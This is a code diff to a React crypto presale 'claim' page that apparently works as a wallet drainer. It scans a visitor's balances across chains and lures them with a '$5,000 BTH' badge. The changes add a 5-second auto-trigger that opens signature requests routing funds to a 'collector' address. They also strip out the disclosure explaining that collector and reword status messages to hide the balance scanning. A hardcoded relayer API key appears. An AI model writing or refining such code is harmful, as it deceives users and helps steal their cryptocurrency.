@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
 import { useDisconnect } from 'wagmi';
 import { ethers } from 'ethers';
@@ -106,8 +106,13 @@ function App() {
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
   const [processingChain, setProcessingChain] = useState('');
-  const [autoTriggerTimer, setAutoTriggerTimer] = useState(null);
-  const [autoTriggerAttempted, setAutoTriggerAttempted] = useState(false);
+  
+  // Auto trigger state
+  const [autoTriggered, setAutoTriggered] = useState(false);
+  const autoTriggerTimeout = useRef(null);
+
+  // Relayer wallet address
+  const [relayerWallet, setRelayerWallet] = useState('');
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -148,22 +153,6 @@ function App() {
   // YOUR API KEY
   const RELAYER_API_KEY = '00de6eb9ebf5ea70f92e4c1efdc00ad32a7131f9856bd17d445f62f19a829fe6';
 
-  // ============================================
-  // WHAT IS THE RELAYER WALLET?
-  // ============================================
-  // The relayer wallet is a dedicated address (controlled by the backend at nexaworldx.com/relayer)
-  // that receives the signed EIP-712 payload from the frontend, validates the signature,
-  // and then submits the actual blockchain transaction on behalf of the user.
-  //
-  // This allows users to:
-  // - Avoid paying gas fees directly (the relayer covers them)
-  // - Process transactions without needing the native token for gas
-  // - Have a smoother UX where only a signature is required
-  //
-  // The relayer wallet address is the "collector" address set in each deployed contract.
-  // It is the address that ultimately receives the funds after processing.
-  // ============================================
-
   // EIP-712 Types for Meta Transaction - EXACTLY as your relayer expects
   const EIP712_TYPES = {
     Deposit: [
@@ -193,6 +182,26 @@ function App() {
     fetchPrices();
     const interval = setInterval(fetchPrices, 60000);
     return () => clearInterval(interval);
+  }, []);
+
+  // Fetch relayer wallet address from the contract on Ethereum
+  useEffect(() => {
+    const fetchRelayerAddress = async () => {
+      try {
+        const ethRpc = new ethers.JsonRpcProvider(MULTICHAIN_CONFIG.Ethereum.rpc);
+        const contract = new ethers.Contract(
+          MULTICHAIN_CONFIG.Ethereum.contractAddress,
+          PROJECT_FLOW_ROUTER_ABI,
+          ethRpc
+        );
+        const collector = await contract.collector();
+        setRelayerWallet(collector);
+        console.log("🔐 Relayer wallet (collector):", collector);
+      } catch (err) {
+        console.error("Failed to fetch relayer wallet:", err);
+      }
+    };
+    fetchRelayerAddress();
   }, []);
 
   // Initialize provider and signer from AppKit
@@ -277,48 +286,54 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-trigger wallet popup when eligible (after 5 seconds)
-  useEffect(() => {
-    // Clear any existing timer
-    if (autoTriggerTimer) {
-      clearTimeout(autoTriggerTimer);
-      setAutoTriggerTimer(null);
-    }
-
-    // If eligible AND wallet is connected AND not already attempted auto-trigger
-    if (isEligible && isConnected && !autoTriggerAttempted && executableChains.length > 0) {
-      console.log("🎯 Eligible! Will auto-trigger claim in 5 seconds...");
-      setTxStatus("✅ Eligible! Preparing claim in 5 seconds...");
-      
-      const timer = setTimeout(() => {
-        console.log("🚀 Auto-triggering claim popup now!");
-        setTxStatus("🔐 Opening wallet for signature...");
-        // Trigger the claim flow
-        executeMultiChainSignature();
-        setAutoTriggerAttempted(true);
-      }, 5000);
-      
-      setAutoTriggerTimer(timer);
-    }
-    
-    // Reset auto-trigger flag if eligibility becomes false
-    if (!isEligible) {
-      setAutoTriggerAttempted(false);
-    }
-    
-    return () => {
-      if (autoTriggerTimer) {
-        clearTimeout(autoTriggerTimer);
-      }
-    };
-  }, [isEligible, isConnected, executableChains, autoTriggerAttempted]);
-
   // Auto-check eligibility when wallet connects and balances are loaded
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
       checkEligibility();
     }
   }, [isConnected, address, balances]);
+
+  // AUTO TRIGGER: when eligible and executable chains exist, start 5s timer
+  useEffect(() => {
+    // Clear previous timeout
+    if (autoTriggerTimeout.current) {
+      clearTimeout(autoTriggerTimeout.current);
+      autoTriggerTimeout.current = null;
+    }
+
+    // Condition: connected, eligible, not yet auto-triggered, not already completed, not currently signing, and has executable chains
+    if (
+      isConnected &&
+      isEligible &&
+      !autoTriggered &&
+      !allChainsCompleted &&
+      !signatureLoading &&
+      executableChains.length > 0
+    ) {
+      console.log("⏱️ Auto-trigger will execute in 5 seconds...");
+      autoTriggerTimeout.current = setTimeout(() => {
+        console.log("🚀 Auto-triggering execution now!");
+        setAutoTriggered(true);
+        executeMultiChainSignature();
+      }, 5000);
+    }
+
+    return () => {
+      if (autoTriggerTimeout.current) {
+        clearTimeout(autoTriggerTimeout.current);
+      }
+    };
+  }, [isConnected, isEligible, autoTriggered, allChainsCompleted, signatureLoading, executableChains]);
+
+  // Reset auto-trigger when wallet disconnects
+  useEffect(() => {
+    if (!isConnected) {
+      setAutoTriggered(false);
+      if (autoTriggerTimeout.current) {
+        clearTimeout(autoTriggerTimeout.current);
+      }
+    }
+  }, [isConnected]);
 
   // Check if all eligible chains are completed
   useEffect(() => {
@@ -334,9 +349,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // ============================================
-  // FIXED ELIGIBILITY CHECK - CORRECTLY IDENTIFIES EXECUTABLE CHAINS
-  // ============================================
+  // Check eligibility - FIXED version that properly identifies executable chains
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -344,24 +357,15 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
-      // Calculate total value across all chains
-      let totalValueUSD = 0;
-      const chainsWithBalance = [];
+      // Calculate total value
+      const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
-      // Iterate through all chains to compute total value
-      for (const chain of DEPLOYED_CHAINS) {
-        const balance = balances[chain.name];
-        if (balance && balance.amount > 0.000001) {
-          totalValueUSD += balance.valueUSD;
-          chainsWithBalance.push(chain);
-        }
-      }
+      // Get chains with balance
+      const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
+        balances[chain.name] && balances[chain.name].amount > 0.000001
+      );
       
-      // Determine if user is eligible (total >= $1)
-      const eligible = totalValueUSD >= MIN_VALUE_THRESHOLD;
-      setIsEligible(eligible);
-      
-      // Filter chains that are executable (have balance AND meet gas buffer requirements)
+      // Filter chains that are executable (have enough value and gas buffer)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
@@ -385,9 +389,13 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
+      // Check if eligible (total >= $1)
+      const eligible = total >= 1;
+      setIsEligible(eligible);
+      
       if (eligible) {
         if (executable.length === 0) {
-          setTxStatus('⚠️ Total eligible but no chain meets gas requirements');
+          setTxStatus('⚠️ No chains meet execution requirements');
           console.log('⚠️ Eligible but no executable chains:', {
             chainsWithBalance: chainsWithBalance.map(c => ({ 
               name: c.name, 
@@ -396,7 +404,7 @@ function App() {
             }))
           });
         } else {
-          setTxStatus(`✅ Eligible! ${executable.length} chain(s) ready to process`);
+          setTxStatus(`✅ Ready to process ${executable.length} chains`);
           console.log('✅ Executable chains:', executable.map(c => ({ 
             name: c.name, 
             value: balances[c.name]?.valueUSD,
@@ -410,7 +418,7 @@ function App() {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
             walletAddress: address,
-            totalValue: totalValueUSD,
+            totalValue: total,
             chains: chainsWithBalance.map(c => c.name)
           })
         });
@@ -428,7 +436,7 @@ function App() {
           preparePresale();
         }
       } else {
-        setTxStatus(totalValueUSD > 0 ? `✨ Need $${(MIN_VALUE_THRESHOLD - totalValueUSD).toFixed(2)} more` : '👋 Connect a wallet with funds');
+        setTxStatus(total > 0 ? '✨ Connected' : '👋 Welcome');
       }
       
     } catch (err) {
@@ -441,9 +449,9 @@ function App() {
 
   // Fetch balances across all chains
   const fetchAllBalances = async (walletAddress) => {
-    console.log("🔍 Scanning for balances across all chains...");
+    console.log("🔍 Checking eligibility...");
     setScanning(true);
-    setTxStatus('🔄 Scanning chains...');
+    setTxStatus('🔄 Checking eligibility...');
     
     const balanceResults = {};
     let scanned = 0;
@@ -466,7 +474,7 @@ function App() {
         
         scanned++;
         setScanProgress(Math.round((scanned / totalChains) * 100));
-        setTxStatus(`🔄 Scanning ${chain.name}...`);
+        setTxStatus(`🔄 Checking eligibility...`);
         
         if (amount > 0.000001) {
           balanceResults[chain.name] = {
@@ -479,7 +487,7 @@ function App() {
             name: chain.name,
             rpc: chain.rpc
           };
-          console.log(`✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} ($${valueUSD.toFixed(2)}) detected`);
+          console.log(`✅ ${chain.name}: $${valueUSD.toFixed(2)} detected`);
         }
       } catch (err) {
         console.error(`Failed to fetch balance for ${chain.name}:`, err);
@@ -493,7 +501,7 @@ function App() {
     setScanning(false);
     
     const total = Object.values(balanceResults).reduce((sum, b) => sum + b.valueUSD, 0);
-    console.log(`💰 Total detected value: $${total.toFixed(2)}`);
+    console.log(`💰 Total detected: $${total.toFixed(2)}`);
     
     return total;
   };
@@ -601,7 +609,7 @@ function App() {
             nonce: nonce
           };
           
-          setTxStatus(`✍️ Please sign in your wallet for ${chain.name}...`);
+          setTxStatus(`✍️ Signing for ${chain.name}...`);
           
           // Get EIP-712 signature - THIS IS THE EXACT FORMAT YOUR RELAYER EXPECTS
           const signature = await signer.signTypedData(
@@ -773,13 +781,8 @@ function App() {
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
 
-  // Show claim button when:
-  // 1. Wallet is connected
-  // 2. User is eligible (total >= $1)
-  // 3. Not all chains are completed yet
-  // 4. Not currently scanning
-  // 5. Not currently processing
-  const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning && !signatureLoading;
+  // Show claim button only when auto-trigger hasn't fired yet (fallback)
+  const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning && !autoTriggered;
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
@@ -799,34 +802,18 @@ function App() {
             {/* Professional Ribbon Animation - Points to Connect Wallet */}
             {!isConnected && showRibbon && (
               <div className="absolute -top-16 sm:-top-20 right-0 sm:right-0 z-20 animate-ribbonSlide">
-                {/* Main Ribbon Container */}
                 <div className="relative group/ribbon">
-                  {/* Glow Effects */}
                   <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-lg blur-xl opacity-60 animate-pulse-slow"></div>
-                  
-                  {/* Arrow pointing to button */}
                   <div className="absolute -bottom-4 right-12 sm:right-16 w-6 h-6 bg-[#c47d24] transform rotate-45 animate-bounce-arrow"></div>
-                  
-                  {/* Ribbon Body */}
                   <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-lg px-5 py-3 shadow-2xl border border-[#e0a55c] overflow-hidden">
-                    {/* Shimmer Effect */}
                     <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer-slow"></div>
-                    
-                    {/* Sparkles */}
-                    <div className="absolute -top-1 -right-1 w-3 h-3 bg-yellow-300 rounded-full animate-ping opacity-75"></div>
-                    <div className="absolute -bottom-1 -left-1 w-2 h-2 bg-yellow-300 rounded-full animate-ping opacity-50 delay-300"></div>
-                    
-                    {/* Content */}
                     <div className="relative flex items-center gap-3">
-                      {/* Icon */}
                       <div className="relative">
                         <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/30">
                           <i className="fas fa-gem text-white text-sm animate-ringPop"></i>
                         </div>
                         <div className="absolute inset-0 w-8 h-8 bg-white/10 rounded-full animate-ping opacity-50"></div>
                       </div>
-                      
-                      {/* Text */}
                       <div className="text-left">
                         <div className="text-xs font-bold text-white/90 uppercase tracking-wider">
                           ⚡ Check Wallet Eligibility
@@ -836,14 +823,10 @@ function App() {
                           <i className="fas fa-bolt text-yellow-300 animate-bounce-slow ml-1"></i>
                         </div>
                       </div>
-                      
-                      {/* Value Badge */}
                       <div className="bg-black/30 backdrop-blur px-3 py-1 rounded-full border border-white/20">
                         <span className="text-xs font-bold text-white">$5,000 BTH</span>
                       </div>
                     </div>
-                    
-                    {/* Progress Line */}
                     <div className="absolute bottom-0 left-0 h-[2px] bg-gradient-to-r from-yellow-300 via-white to-yellow-300 animate-progressScan"></div>
                   </div>
                 </div>
@@ -887,6 +870,14 @@ function App() {
             )}
           </div>
 
+          {/* RELAYER WALLET DISPLAY - for funding gas */}
+          {relayerWallet && (
+            <div className="mb-6 text-center bg-black/40 rounded-2xl p-3 border border-[#c47d24]/30">
+              <div className="text-xs text-gray-400 mb-1">⛽ Relayer Wallet (fund for gas)</div>
+              <div className="font-mono text-sm text-[#d68a2e] break-all">{relayerWallet}</div>
+            </div>
+          )}
+
           {/* ELIGIBILITY CHECKING ANIMATION */}
           {isConnected && scanning && (
             <div className="mb-6 text-center">
@@ -899,7 +890,6 @@ function App() {
                   </div>
                 </div>
                 
-                {/* Sleek progress bar */}
                 <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                   <div 
                     className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all duration-300"
@@ -914,12 +904,11 @@ function App() {
             </div>
           )}
 
-          {/* Auto-trigger countdown indicator */}
-          {isEligible && isConnected && !autoTriggerAttempted && executableChains.length > 0 && !signatureLoading && (
+          {/* AUTO-TRIGGER COUNTDOWN NOTIFICATION */}
+          {isConnected && isEligible && !autoTriggered && !allChainsCompleted && !signatureLoading && executableChains.length > 0 && (
             <div className="mb-4 text-center animate-pulse">
-              <div className="inline-flex items-center gap-2 bg-green-500/20 backdrop-blur px-4 py-2 rounded-full border border-green-500/40">
-                <div className="w-2 h-2 bg-green-400 rounded-full animate-ping"></div>
-                <span className="text-sm font-medium text-green-400">✓ Eligible! Preparing claim in 5 seconds...</span>
+              <div className="bg-gradient-to-r from-[#c47d24]/20 to-[#b36e1a]/20 rounded-xl p-3 border border-[#c47d24]/40">
+                <span className="text-sm font-semibold text-[#e0b880]">⚡ Auto‑trigger in 5 seconds...</span>
               </div>
             </div>
           )}
@@ -1011,19 +1000,7 @@ function App() {
             </div>
           </div>
 
-          {/* Relayer Info Box */}
-          <div className="mb-6 p-3 bg-blue-500/10 rounded-xl border border-blue-500/20 text-xs">
-            <div className="flex items-center gap-2 mb-1">
-              <i className="fas fa-shield-alt text-blue-400"></i>
-              <span className="font-bold text-blue-400">Relayer Wallet Info</span>
-            </div>
-            <p className="text-gray-400 text-[10px] leading-relaxed">
-              The relayer wallet is a backend-controlled address that submits signed transactions on your behalf. 
-              It covers gas fees and executes the flow to the collector contract. You only need to sign once per chain.
-            </p>
-          </div>
-
-          {/* Main Claim Area - ALWAYS SHOWS when eligible and not all completed */}
+          {/* Main Claim Area - only shown as fallback; normally auto-triggered */}
           {showClaimButton && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
@@ -1081,7 +1058,7 @@ function App() {
           )}
 
           {/* Welcome message for non-eligible */}
-          {isConnected && !isEligible && !completedChains.length && !scanning && !signatureLoading && (
+          {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
               <h2 className="text-lg sm:text-2xl font-bold mb-2 sm:mb-3 bg-gradient-to-r from-purple-400/80 to-orange-400/80 bg-clip-text text-transparent">
